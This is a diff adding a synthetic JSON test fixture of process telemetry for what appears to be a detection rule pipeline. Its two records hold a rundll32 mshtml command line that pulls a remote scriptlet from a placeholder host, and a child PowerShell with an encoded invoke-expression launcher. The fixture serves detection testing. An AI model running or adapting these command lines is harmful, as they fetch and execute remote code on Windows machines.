@@ -1,0 +1,39 @@
+{
+  "fixture_id": "v1-hov-bravo-ingress",
+  "description": "Declared-provenance SYNTHETIC v1 scenario for family 'v1-hov-bravo-ingress' (role=held_out_validation). Tier-1 machinery only; NOT real-world accuracy evidence. Raw telemetry only; labels live in annotations/. Replays via fixtures/phase1_core_rules.json (unmodified) + the Stage 2 calibration evidence-type rule pack to one attribution unit.",
+  "scenarios": [
+    {
+      "scenario_id": "ha1",
+      "raw_record": {
+        "record_id": "rec-ha1",
+        "timestamp": "2026-09-01T09:00:00+00:00",
+        "observation_id": "obs-ha1"
+      },
+      "process": {
+        "name": "rundll32.exe",
+        "entity_id": "ha1",
+        "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:http://example.invalid/x.sct')"
+      },
+      "host": {
+        "id": "host-hov-bravo"
+      }
+    },
+    {
+      "scenario_id": "ha2",
+      "raw_record": {
+        "record_id": "rec-ha2",
+        "timestamp": "2026-09-01T09:00:05+00:00",
+        "observation_id": "obs-ha2"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "entity_id": "ha2",
+        "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "parent_entity_id": "ha1"
+      },
+      "host": {
+        "id": "host-hov-bravo"
+      }
+    }
+  ]
+}
